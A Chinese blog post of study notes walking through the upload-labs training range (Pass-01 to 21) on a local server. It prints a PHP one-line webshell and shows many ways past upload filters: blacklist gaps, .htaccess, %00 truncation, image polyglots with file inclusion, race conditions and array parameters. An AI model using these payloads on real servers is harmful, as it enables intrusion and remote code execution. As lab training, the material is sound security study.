---
title: 'upload学习笔记'
published: 2026-04-17
description: 'upload_labs Less1-21 wp'
tags: [Security]
category: note
draft: false
---

# 文件上传漏洞

上传文件时，目标服务器对上传的文件内容及后缀没做严格的过滤，对文件存储的路径没做限制。

文件上传漏洞的条件：木马文件`(php、jsp、asp、exe)--eval system exec assert` 可以绕过目标服务器检测成功上传，可以获取到上传路径，上传路径具备可执行权限。

一句话木马： `<?php @eval($_POST['cmd']); ?>`

```
<?php ?>:告诉 PHP 解释器标签内部是 PHP 代码，需要执行。
$_POST['cmd']:$_POST 是 PHP 的一个超全局数组，用来接收 POST 参数。这里的 cmd 只是参数名称，可以换成其他名称。
eval():eval()函数会把收到的字符串再次当作 PHP 代码解释。
@:PHP 中的 @ 是错误抑制运算符。如果执行的代码存在错误，@ 会尽量避免把错误信息显示在页面上。
```

# Pass-01-前端校验

先分别传入一张正常的 .jpg 图片和一个 .txt 文件，可以发现图片可以提交，非图片文件会立即弹窗阻拦，弹窗出现的非常快，页面甚至没有经过正常的请求响应过程。所以可以猜测 阻止动作很可能发生在浏览器端，而不是服务器端。

1. 先看一下源码。白名单为图片类型。且确实是在前端对不合法文件进行验证的。

   ![image-20260718001815614](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260718001816076.png)

   可以传一个图片马：在记事本中写个一句话木马，保存为.jpg文件。

   ![image-20260718004215300](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260718004215378.png)

2. 在burp里拦截上传请求，可以看到文件内容就是一句话木马。现在将 filename 从 shell.jpg 改成 shell.php。

   ![5ad113f3927898365466e95cd3e3a8e0](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260718004454880.png)

   Forward，可以看到请求已经传到服务器了。

   ![image-20260718005044026](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260718005044102.png)

3. 向上传后的 php 发送 post 参数：`Content-Type: application/x-www-form-urlencoded`意思是告诉 php 请求正文使用普通表单参数格式，Burp 抓包普通登录、提交表单的请求，基本都是这个 Content-Type。`echo%20%22WEB-SHELL-OK%22%3B`是参数值，因为请求头声明了表单格式，PHP 会将它解析成：`$_POST['cmd']`。

   ```
   POST /upload-labs/upload/shell.php HTTP/1.1
   Host: localhost
   Content-Type: application/x-www-form-urlencoded
   Connection: close
   
   cmd=echo%20%22WEB-SHELL-OK%22%3B
   ```

   ![image-20260718005230866](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260718005230920.png)

   成功拿到 webshell：

   ![image-20260718010306110](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260718010306189.png)

完整利用链：

```
发现只能选择图片
        ↓
判断限制来自前端 JavaScript 而非服务器
        ↓
选择正常的 .jpg 文件通过前端检查，再通过 Burp Proxy 拦截上传请求，将 filename 从 .jpg 改成 .php
        ↓
服务器后端果然没有再次检查扩展名，PHP 文件被保存到 /upload/ 目录，上传目录允许解析 PHP
        ↓
通过 POST 参数传入 PHP 代码，访问上传后的 shell.php
        ↓
一句话木马执行参数内容，获得服务器端 PHP 代码执行能力
```

# Pass-02-后端白名单校验

这次是在服务后端对不合法文件进行验证的了，白名单类型依然是图片。但是后端只校验 Content-Type，完全不校验文件名后缀。所以这和绕过前端验证的方法也没啥区别，直接传一个图片马，在burp里改filename就行了， Content-Type 本来就是白名单里的`image/jpeg`。

![edab49f697ef9144166d657766ccf96e](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260719015240683.png)

![image-20260719020409952](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260719020410115.png)

![image-20260719020511711](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260719020511798.png)

利用链：

```
发现只能选择图片
        ↓
判断限制来自后端，但是后端仅对 Content-Type 做校验，完全不校验文件名后缀。
        ↓
选择正常的 .jpg 文件通过前端检查，再通过 Burp Proxy 拦截上传请求，将 filename 从 .jpg 改成 .php
        ↓
服务器后端果然没有检查扩展名，PHP 文件被保存到 /upload/ 目录，上传目录允许解析 PHP
        ↓
通过 POST 参数传入 PHP 代码，访问上传后的 shell.php
        ↓
一句话木马执行参数内容，获得服务器端 PHP 代码执行能力
```

# Pass-03-后端黑名单校验

1. 查看源码，发现这次是黑名单验证，禁止上传`asp、aspx、php、jsp`这四种后缀的文件。并且会对上传的文件名做随机数字处理。

   ![2cf945aed3ed3fcd0fbae5ee567f9062](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260723005644557.png)

2. 这时候我们就要想办法绕过，在网上查了一下，说黑名单规则不严谨，在某些特定环境中某些特殊后缀仍会被当作php文件解析 php、php2、php3、php4、php5、php6、php7、pht、phtm、phtml。我们这里用 .php5 试一下，直接上传一个名为 shell.php5 的文件，可以发现直接上传成功。

   ![0d47b560-e450-4bad-9abf-a1d4d5e425a2](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260723011044417.png)	

3. 也确实是被当作php文件解析了。

   ![image-20260723011325539](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260723011325626.png)

# Pass-04

看下源码，发现这关黑名单比第三关多了很多。这个时候就只能构造.htaccess文件了。(利用Apache漏洞)![image-20260723013901651](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260723013901766.png)

首先创建一个.htaccess文件，内容如下：

```
AddType application/x-httpd-php .jpg
```

**这个文件的作用就是将同目录（含有子目录）下的所有可执行的php文件，都具有执行权力。这样上传jpg，但是jpg的内容里有php的代码，他就能执行。相当于给了一个环境。**

![image-20260723020635645](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260723020635705.png)

先上传这个.htaccess，再上传一个图片马。访问这个图片马。可以看到确实是被当作php文件解析了。

![image-20260723023348234](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260723023348293.png)

发送 post 参数。拿到 websell。

![image-20260723023631751](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260723023631829.png)



# Pass-05

这关黑名单过滤的特别多，连 .htaccess 都传不上去了。但仔细看它漏掉了 .php1。那就和 pass-03一样了，传一个 shell.php1。

```
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
```

![image-20260723030829114](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260723030829197.png)

# Pass-06

看下源码，可以看到这关没有转换大小写的代码：`$file_ext = strtolower($file_ext); //转换为小写`。这样我们就可以上传大小写混合的后缀名来进行绕过。

![image-20260724013416022](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260724013416186.png)

上传一个shell.Php，直接上传成功。

![image-20260724033901095](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260724033901406.png)

![image-20260724040421257](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260724040421360.png)

# Pass-07

这一关的源码是缺少这一句： `$file_ext = trim($file_ext); //首尾去空`。

![image-20260724042312269](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260724042312391.png)

可以在后缀添加一个空格进行绕过，但是在Windows系统中我们无法创建后缀带空格的文件，但是在数据包中不会对后缀的空格进行清除，那么我们这里就需要使用到BS进行抓包，对其进行修改，然后再进行上传。

通过修改后上传到对方服务器的时候，服务器会自动对后面的空格清除，就实现了绕过。

![image-20260724042520228](C:\Users\32628\AppData\Roaming\Typora\typora-user-images\image-20260724042520228.png)

成功上传。

![image-20260724042734291](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260724042734419.png)

![image-20260724042909719](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260724042909810.png)

# Pass-08

这一关源码是少了这一句：`$file_name = deldot($file_name);//删除文件名末尾的点`

所以这关是用点绕过，点绕过和空格绕过是一样的，都是利用操作系统的特性来进行解析绕过。和空格一样，上传成功后，服务器会自动删除点的。

![image-20260724043942169](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260724043942285.png)

成功绕过。

![image-20260724044027228](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260724044027323.png)

![image-20260724044130169](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260724044130249.png)

# Pass-09

`::$DATA` 绕过。

在window的时候如果文件名+`::$DATA`会把`::$DATA`之后的数据当成文件流处理,不会检测后缀名，且保持`::$DATA`之前的文件名，加它的目的就是不检查后缀名。

这一关源码就是缺少了这一句：`$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA`。所以可以在文件名后面添加`::$DATA` 进行绕过。

![image-20260726001318359](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260726001318765.png)

成功上传。

![image-20260726001407448](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260726001407577.png)

![image-20260726001629605](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260726001629685.png)

# Pass-10

这一关咋一看还是和pass-05一样漏掉了过滤.php1，所以可以用后缀.php1绕过。但是这个可能真的是漏掉了，这里我们不用这个绕过方法。

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这是Pass-10的源码，看上去过滤和处理做的都很全，但仔细看会发现，没有循环验证：`deldot()` 在 `trim()` 之前执行，而 `trim()` 后没有重新做后缀检查。也就是说，转换大小写去除点和空格什么的它只验证一次。

清晰的思路应该是：

```
 .php 后依次加：点 → 空格 → 点（在 Burp 里拦截请求文件名中写：filename="shell.php. ."）
 
处理流程：
deldot() 先删最后一个点
shell.php. [空格]

取后缀得到
. [空格]

trim() 后变成
.

"." 不在黑名单 → 上传通过

但保存到 Windows 后，末尾的空格、点会被系统继续清理，最终落盘成：
shell.php
```

![image-20260726013417805](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260726013418089.png)

上传成功。

![image-20260726013628156](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260726013628299.png)

![image-20260726013728607](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260726013728695.png)

想做好一个无漏洞的文件上传功能真的需要想很多啊！

# Pass-11

查看这一关源码，可以看到没有了前几关的验证方式，而且是一个黑名单验证，意思是如果上传了它这些后缀的文件，就会把后缀名删除，没了后缀名也就无法正常解析。这次因为他没有前机关的验证方式，所以我们也就无法利用验证方式绕过。

![image-20260726015721848](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260726015721962.png)

不过这关同样是只验证一次，所以我们只需要把后缀改为.pphphp，它删除掉中间的php后后缀仍然为php，以此实现绕过。

成功上传 webshell。

![image-20260726021319615](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260726021319747.png)

![image-20260726021352791](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260726021352872.png)

# Pass-12-可控保存路径

这一关是一个白名单上传。关键的代码是：

`$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;`

`save_path` 完全由 GET 参数控制，且直接拼进最终保存路径。后面还有一个后缀名需要绕过，这个时候需要使用%00截断，不过这个东西已经是旧时代的产物的，所以有使用条件：php版本小于5.3.4 ；php的magic_quotes_gpc为OFF状态。

（ 当 PHP 在处理文件名或路径时，如果遇到 URL 编码的 %00，它会被解释为一个空字节（ASCII 值为 0）。在php5.3以前，PHP 会将这个空字节转换为 \000 的形式。

而恰恰在php5.3以前，文件名出现\0000,会导致文件名被截断，只保留%00之前的部分。这样的情况可能会导致文件被保存到一个意外的位置，从而产生安全风险

这是因为php语言的底层是c语言，而\0在c语言中是字符串 的结束符，所以导致00截断的发生 ）

![image-20260726022135525](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260726022135639.png)

所以清晰地思路是：

```
上传时文件名仍用允许的：shell.jpg
用Burp抓包，在save_path这里修改成 ../upload/shell.php%00
后端本来会拼成：../upload/shell.php%00/随机名.jpg
旧版 PHP/Windows 对 %00 解码出的空字节处理不严时，会在空字节截断，实际目标变成：../upload/shell.php
shell.php被成功上传，内容为shell.jpg的内容。
这就是“白名单图片后缀 + 可控保存路径 + 空字节截断”。
```

![4949e6fe888b8511e2e158428f07f0b5](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260726023300105.png)

# Pass-13

这一关save_path的接受值从get变成了post： 

`$img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;`

它两的区别就是 get 会自行解码，而 post 不会解码，所以需要对 %00 进行解码。所以在这一关我们就需要改post请求体里的`save_path`，并且在 shell.php 后面加%00后手动进行urldecode编码：将%00 转成原始的十六进制 `0x00`。

```
POST /upload-labs/Pass-13/index.php?action=show_code HTTP/1.1
Host: 127.0.0.1
Content-Length: 425
Cache-Control: max-age=0
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXg6vzIcRN2t9Bgyh
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://127.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/upload-labs/Pass-13/index.php?action=show_code
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryXg6vzIcRN2t9Bgyh
Content-Disposition: form-data; name="save_path"

../upload/
------WebKitFormBoundaryXg6vzIcRN2t9Bgyh
Content-Disposition: form-data; name="upload_file"; filename="shell.jpg"
Content-Type: image/jpeg

<?php @eval($_POST['cmd']); ?>
------WebKitFormBoundaryXg6vzIcRN2t9Bgyh
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryXg6vzIcRN2t9Bgyh--

```

这是burp抓到的原始包，我们将`../upload/`改成`../upload/shell.php%00`。选中`%00`右键选择`convert selection`，然后选择URL最后选择网址解码即可进行解码。

![image-20260726025250776](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260726025250863.png)

![image-20260726025209332](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260726025209441.png)

# Pass-15 文件包含

白名单之文件包含漏洞getimagesize()检测绕过

`getimagesize(图片路径)` 成功读取图片时，返回一个数组 `$info`。

数组下标定义（固定规范）：

- `$info[0]`：图片宽度
- `$info[1]`：图片高度
- **`$info[2]`：图片类型数字常量**
- `$info[3]`：宽高字符串，例如 `width="800" height="600"`

所以这关会读取文件二进制头部（而不是依赖文件名后缀），判断文件类型，并且后端会根据判断得到的文件类型重命名上传文件。所以这关伪造文件名、MIME 都没用。

![image-20260727052533279](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260727052533488.png)

使用 `图片马 + 本地文件包含` 绕过。

制作图片马（找张gif图，末尾追加一句php代码）

![73708e75ed090d7b1af5a9bf3ee79795](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260727061237072.png)

上传。右键查看网页源码找到重命名后的文件名。

![c4bf7d1b04bde54a79bfa5afcf4f3dda](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260727061333999.png)

然后进入文件包含漏洞地址`http://127.0.0.1/upload-labs/include.php?file=upload/2720260727061309.gif`，进行文件包含。

`include.php` 的核心是：

```
include $_GET['file'];
```

PHP 的 `include` 不看文件后缀，会把 GIF 文件中的 `<?php ... ?>` 代码段解析执行；前面的 GIF 二进制内容只会作为普通输出。这样页面显示 `PASS15_OK`，就说明思路成功。

![image-20260727061434494](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260727061434602.png)

# Pass-14

Pass-14 比 Pass-15 弱很多：它只读取上传文件的前两个字节。然后把前两个字节当作类型判断。

![image-20260727062004653](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260727062004799.png)

所以无需一张真正完整的图片。最简单用 GIF 头伪造：前两个字符是 `GI`，能通过 GIF 判断；服务器会随机保存成：随机名.gif

![image-20260727062344952](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260727062345038.png)

和Pass-15一样上传后右键查看网页源码找到重命名后的文件名，然后访问文件包含地址。

![5dadfc6edd81f0e50aedae72be2f65a9](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260727062556481.png)

![image-20260727062720304](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260727062720386.png)

和Pass-15的区别：

```
Pass-14：只验前 2 字节，GIF89a + PHP 即可。
Pass-15：getimagesize()，需要完整有效图片，再在末尾追加 PHP。
```

# Pass-16

白名单之文件包含漏洞exif_imagetype()检测绕过

这一关用的是`exif_imagetype`函数，它比 Pass-14 严一点，但仍只识别 文件头特征 ，不会像 `getimagesize()` 那样真正解析完整图片。

![image-20260727065008543](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260727065008676.png)

手法是和pass-14一样的。`GIF89a` 让 `exif_imagetype()` 识别为 GIF；服务端随机保存为 `.gif`；再通过包含页执行。

![image-20260727065201211](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260727065201289.png)

![image-20260727065311627](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260727065311746.png)

![image-20260727065434078](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260727065434151.png)

区别：

```
Pass-14：只读前 2 字节，GI 即可。
Pass-15：getimagesize()，必须是真实完整图片。
Pass-16：exif_imagetype()，需要正确 GIF 文件头（GIF87a/GIF89a），但不需要完整图片。
```

# Pass-17

白名单之文件包含漏洞突破二次渲染

补充知识：
二次渲染：后端重写文件内容
basename(path[,suffix]) ，没指定suffix则返回后缀名，有则不返回指定的后缀名
strrchr(string,char)函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。
imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像
imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像
imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像



这一关对上传图片进行了判断了文件名、content-type，以及利用 imagecreatefromgif 判断是否为gif图片后做了一次二次渲染。

![image-20260730023408375](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260730023408838.png)

imagecreatefromgif（）函数，二次渲染是由 Gif 文件或 URL 创建一个新图象。成功则返回一图像标识符/图像资源，失败则返回false，导致图片马的数据丢失。按照前几关的方式上传，可以上传，但是包含漏洞无法解析。原因就是二次渲染将图片马里面的php代码删了。

思路是把上传的图片再保存到本地（右键查看网页源码找到重命名后的文件名在浏览器里访问就能下载），比较原图和二次渲染后的图片（用 beyond compare），找到没有被渲染的地方，在这个地方插入php代码再重新上传。

这里用的是网上的一个大佬的二次渲染专用图：https://wwe.lanzoui.com/iFSwwn53jaf

放进 beyond compare，左边是原图，右边是经过了二次渲染的图。红色区域都是两张图不同的地方。

![image-20260730033514585](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260730033514893.png)

找一块连续的黑色区域插入php代码即可。

![4c6cf93d-f88c-4340-8b4e-455ce1cc3919](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260730035639000.png)

再重新上传。`<?php phpinfo()?>` 成功执行！这个题有意思！

![image-20260730035752202](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260730035752370.png)

# Pass-18 条件竞争

看一下源码：发现如果上传的符合它的白名单，那就进行重命名，如果不符合，直接删除！解析的机会都没有，这让我想到了条件竞争，如果我在它删除之前就访问这个文件，他就不会删除了。

![image-20260810213403958](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260810213404162.png)

上传一个php文件，然后burp抓包发到爆破模块

![dd3bf3974b67fcc2295b3914204e548e](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260810215348558.png)

Clear所有的标记，然后设置payload：payload type选null payloads (生成“空 Payload”，实际效果是原样重复发送基础请求)，连续上传1000次。

![image-20260810223122098](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260810223122263.png)

同时开一个请求，也是连续请求访问1000次。

![c65eddf8a0acccfee6cf4831d103d420](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260810224129375.png)

两个同时开始 start attack；看看有没有哪次请求能命中“文件已上传、尚未 unlink 删除”的窗口。

条件竞争的思路就是：

```
并发跑两类请求：
不断上传同一个 shell18.php（后缀故意不合法）。
同时不断访问：http://127.0.0.1/upload-labs/upload/shell18.php

只要访问请求落在“已保存、未删除”的极短窗口内，就能命中。
```

# Pass-19

Pass-19 的核心也是条件竞争，但和 Pass-18 不一样：

- Pass-18：先按原名保存 `.php`，再检查后缀，失败后 `unlink()` 删除。
- Pass-19：先校验白名单后缀，保存原文件名，随后立刻重命名为时间戳文件名。

所以php是不能上传了，只能上传图片马了，而且需要在图片马没有被重命名之前访问它。要让图片马能够执行还要配合其他漏洞，比如文件包含，apache解析漏洞等。

手法和pass-18基本一致。

```
不断上传：shell19.gif
不断访问：include.php?file=upload/shell19.gif
```

# Pass-20

move_uploaded_file函数绕过

move_uploaded_file()这样一个函数，有一个特性，会忽略掉文件末尾的/. 及后面的内容。并且 move_uploaded_file() 函数中的 img_path 是由post参数 save_name 控制的，这就可以在 save_name 的参数上面改动。

看到20关的页面，明显比前面的多了点东西，多了一个保存名称。查看源码，没有对上传的文件做判断，只对用户输入的文件名做判断。

![image-20260811041518891](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260811041519043.png)

直接上传shell20.jpg，抓包，修改为shell20.php在末尾加上/.。这样保存的

![01bd75ee879ecea482f645aa756ded04](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260811044346575.png)

直接访问，拿下

![image-20260811044231056](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260811044231220.png)

这个题的原理就是利用move_uploaded_file函数的特性：

```
校验看见：shell20.php/.  → 不是 php → 放行
保存得到：shell20.php    → PHP 文件
```

# Pass-21

文件名数组绕过。

好好看一下源码分析一下：

先只看这一句：

```
$file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
```

服务器会取“保存名称”这个输入框的内容，放进 $file。

正常提交时，我们可以传：

```
save_name=shell.jpg
```

服务器得到：

```
$file = "shell.jpg";
```

但 Burp 可以把参数名改成带方括号的：

```
save_name[0]=shell21.php
save_name[2]=jpg
```

在 PHP 里，带 `[数字]` 就表示“这是一个列表”。因此服务器得到的 $file 是：

```
$file[0] = "shell21.php";
$file[2] = "jpg";
```

现在源码做两件事。

第一件，检查后缀：

```
$ext = end($file);
```

`end($file)` 的意思是“拿最后放进去的值”，即：

```
$ext = "jpg";
```

所以这句放行：

```
in_array("jpg", ['jpg', 'png', 'gif'])  // true
```

第二件，生成文件名：

```
$file_name = reset($file) . '.' . $file[count($file) - 1];
```

这一行先拆成：

```
reset($file)          // 拿第一个下标的值 → shell21.php
count($file)          // 一共只传了两个下标（0 和 2）→ 2
$count - 1            // → 1
$file[1]              //  下标为1的值是空的
```

因此它最终拼接：

```
shell21.php + . + 空
```

得到：

```
shell21.php.
```

Windows 保存文件时去掉文件名尾部的点，变成：

```
shell21.php
```

所以整体思路是：

```
[2] 放 jpg，让“检查”通过；
[1] 故意不放内容，让“保存名”变成 shell21.php.；
Windows 再把末尾点去掉。
```

![image-20260811050853219](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260811050853380.png)

![bcc3715d-6e32-46e8-9330-535ffcb5de25](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260811053826060.png)

拿下

![image-20260811053855954](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260811053856123.png)
